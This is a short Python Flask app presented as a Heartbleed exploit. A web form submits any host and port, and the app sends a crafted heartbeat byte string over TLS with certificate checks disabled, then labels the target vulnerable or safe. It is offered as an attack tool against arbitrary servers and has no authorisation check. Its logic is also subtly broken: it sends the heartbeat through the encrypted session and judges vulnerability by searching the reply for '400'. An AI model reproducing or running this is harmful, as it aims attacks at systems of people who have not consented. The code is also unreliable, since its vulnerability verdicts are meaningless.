from flask import Flask, render_template, request, jsonify
import socket
import ssl

#https: 443
#http: 80

app = Flask(__name__)

def heartbleed_exploit(target_host, target_port):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    try:
        with socket.create_connection((target_host, target_port)) as client:
            with context.wrap_socket(client, server_hostname=target_host) as client_ssl:
                heartbeat_request = b'\x18\x03\x02\x00\x03\x01@\x00'
                client_ssl.sendall(heartbeat_request)
                result = f"Sent heartbeat request: {heartbeat_request}\n\n"

                data = b""
                while True:
                    chunk = client_ssl.recv(1024)
                    if not chunk:
                        break
                    data += chunk

                result += f"Received: {data}\n"

                if b"400" in data or data == b'':
                    safety_status = "Safe (Not Vulnerable to Heartbleed)"
                else:
                    safety_status = "Unsafe (Potentially Vulnerable to Heartbleed)"

    except socket.gaierror:
        result = "Error: Invalid host or port"
        safety_status = "Unknown"
    except socket.error as e:
        result = f"Socket error: {e}"
        safety_status = "Unknown"

    return result, safety_status

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/exploit', methods=['POST'])
def exploit():
    target_host = request.form.get('host')
    target_port = request.form.get('port')

    if not target_host or not target_port:
        return jsonify({"error": "Please provide both host and port"}), 400

    try:
        target_port = int(target_port)
    except ValueError:
        return jsonify({"error": "Port must be a valid integer"}), 400

    result, safety_status = heartbleed_exploit(target_host, target_port)
    return jsonify({"result": result, "safety_status": safety_status})

if __name__ == '__main__':
    app.run(debug=True)
